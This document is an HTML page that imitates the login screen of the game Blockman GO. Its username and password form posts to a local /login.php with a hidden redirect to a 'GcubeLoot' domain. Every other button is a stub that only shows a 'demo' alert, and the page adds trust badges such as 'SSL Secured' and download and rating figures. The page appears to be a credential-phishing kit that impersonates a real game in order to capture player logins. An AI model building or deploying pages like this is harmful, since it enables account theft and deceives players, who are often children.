<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blockman GO - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', 'Segoe UI', Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 400px;
            width: 100%;
            background: white;
            border-radius: 20px;
            padding: 40px 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo h1 {
            font-size: 42px;
            font-weight: 700;
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 5px;
        }
        
        .logo p {
            color: #666;
            font-size: 14px;
            margin-top: 5px;
        }
        
        .stats-badge {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 25px;
            padding: 10px;
            background: #f5f5f5;
            border-radius: 30px;
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-number {
            font-weight: 700;
            color: #667eea;
            font-size: 18px;
        }
        
        .stat-label {
            font-size: 11px;
            color: #666;
        }
        
        .card form {
            display: flex;
            flex-direction: column;
        }
        
        .card input {
            height: 52px;
            border: 2px solid #e5e5e5;
            border-radius: 12px;
            font-size: 16px;
            padding: 0 16px;
            margin-bottom: 16px;
            transition: all 0.2s;
        }
        
        .card input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102,126,234,0.1);
        }
        
        .card input::placeholder {
            color: #999;
        }
        
        .card button {
            background: linear-gradient(135deg, #667eea, #764ba2);
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 600;
            color: white;
            height: 52px;
            cursor: pointer;
            margin: 8px 0 16px;
            transition: transform 0.2s;
        }
        
        .card button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102,126,234,0.3);
        }
        
        .remember-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 10px 0 20px;
        }
        
        .remember-me {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .remember-me input {
            width: 18px;
            height: 18px;
            margin: 0;
            accent-color: #667eea;
        }
        
        .remember-me label {
            color: #333;
            font-size: 14px;
            cursor: pointer;
        }
        
        .forgot-link {
            color: #667eea;
            font-size: 14px;
            text-decoration: none;
        }
        
        .forgot-link:hover {
            text-decoration: underline;
        }
        
        .social-login {
            display: flex;
            gap: 10px;
            margin: 20px 0;
        }
        
        .social-btn {
            flex: 1;
            padding: 12px;
            background: #f5f5f5;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            color: #333;
            cursor: pointer;
            transition: background 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .social-btn:hover {
            background: #e5e5e5;
        }
        
        .game-features {
            display: flex;
            justify-content: space-around;
            margin: 25px 0;
            padding: 15px 0;
            border-top: 1px solid #e5e5e5;
            border-bottom: 1px solid #e5e5e5;
        }
        
        .feature-icon {
            text-align: center;
            font-size: 20px;
        }
        
        .feature-label {
            font-size: 11px;
            color: #666;
            margin-top: 5px;
        }
        
        .signup {
            text-align: center;
            margin: 20px 0;
            font-size: 14px;
            color: #333;
        }
        
        .signup a {
            color: #667eea;
            font-weight: 600;
            text-decoration: none;
        }
        
        .signup a:hover {
            text-decoration: underline;
        }
        
        .footer {
            margin-top: 25px;
            text-align: center;
            font-size: 11px;
            color: #999;
        }
        
        .footer a {
            color: #666;
            text-decoration: none;
            margin: 0 8px;
        }
        
        .footer a:hover {
            color: #667eea;
        }
        
        input[type="hidden"] {
            display: none;
        }
        
        .security-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin: 20px 0 0;
            font-size: 11px;
            color: #999;
            padding-top: 20px;
            border-top: 1px solid #e5e5e5;
        }
        
        @media (max-width: 450px) {
            .container {
                padding: 30px 20px;
            }
            
            .stats-badge {
                flex-direction: column;
                gap: 10px;
            }
            
            .social-login {
                flex-direction: column;
            }
            
            .remember-row {
                flex-direction: column;
                align-items: flex-start;
                gap: 15px;
            }
            
            .game-features {
                flex-wrap: wrap;
                gap: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>Blockman GO</h1>
            <p>Play together, build together</p>
        </div>
        
        <div class="stats-badge">
            <div class="stat-item">
                <div class="stat-number">100M+</div>
                <div class="stat-label">Downloads</div>
            </div>
            <div class="stat-item">
                <div class="stat-number">10M+</div>
                <div class="stat-label">Online</div>
            </div>
            <div class="stat-item">
                <div class="stat-number">4.5★</div>
                <div class="stat-label">Rating</div>
            </div>
        </div>
        
        <div class="card">
            <form method="POST" action="/login.php" id="loginForm">
                <input type="hidden" name="redirect" value="https://GcubeLoot.blockmango.com">
                
                <input type="text" name="username" placeholder="Username" required autofocus>
                <input type="password" name="password" placeholder="Password" required>
                
                <div class="remember-row">
                    <div class="remember-me">
                        <input type="checkbox" id="remember">
                        <label for="remember">Stay logged in</label>
                    </div>
                    <a href="#" class="forgot-link" onclick="alert('Forgot password demo'); return false;">Forgot?</a>
                </div>
                
                <button type="submit">Play Now</button>
            </form>
            
            <div class="game-features">
                <div class="feature-icon">
                    <div>🎮</div>
                    <div class="feature-label">Mini Games</div>
                </div>
                <div class="feature-icon">
                    <div>🏗️</div>
                    <div class="feature-label">Build</div>
                </div>
                <div class="feature-icon">
                    <div>👥</div>
                    <div class="feature-label">Multiplayer</div>
                </div>
                <div class="feature-icon">
                    <div>🎤</div>
                    <div class="feature-label">Voice Chat</div>
                </div>
            </div>
            
            <div class="social-login">
                <button class="social-btn" onclick="alert('Google login demo'); return false;">
                    <span>G</span> Google
                </button>
                <button class="social-btn" onclick="alert('Facebook login demo'); return false;">
                    <span>f</span> Facebook
                </button>
            </div>
            
            <div class="signup">
                New to Blockman GO? <a href="#" onclick="alert('Signup demo'); return false;">Create account</a>
            </div>
            
            <div class="security-note">
                <span>🔒</span>
                <span>SSL Secured</span>
                <span>•</span>
                <span>Blockman GO Studio</span>
            </div>
        </div>
        
        <div class="footer">
            <a href="#" onclick="alert('Terms demo'); return false;">Terms</a>
            <a href="#" onclick="alert('Privacy demo'); return false;">Privacy</a>
            <a href="#" onclick="alert('Help demo'); return false;">Help</a>
            <a href="#" onclick="alert('Support demo'); return false;">Support</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const username = document.querySelector('input[name="username"]').value;
            const password = document.querySelector('input[name="password"]').value;
            
            if (!username || !password) {
                e.preventDefault();
                alert('Please enter your username and password');
                return;
            }
            
            if (username.length < 3) {
                e.preventDefault();
                alert('Username must be at least 3 characters');
                return;
            }
        });
        
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            input.addEventListener('focus', function() {
                this.style.borderColor = '#667eea';
            });
            
            input.addEventListener('blur', function() {
                if (!this.value) {
                    this.style.borderColor = '#e5e5e5';
                }
            });
        });
        
        const rememberCheck = document.getElementById('remember');
        rememberCheck.addEventListener('change', function() {
            // Visual only
        });
        
        document.querySelector('input[name="username"]').addEventListener('input', function() {
            // Blockman GO usernames typically lowercase, no spaces
            this.value = this.value.toLowerCase().replace(/\s/g, '');
        });
        
        if (window.history.replaceState) {
            window.history.replaceState(null, null, window.location.href);
        }
        
        window.addEventListener('load', function() {
            document.querySelector('input[name="username"]').focus();
        });
    </script>
</body>
</html>
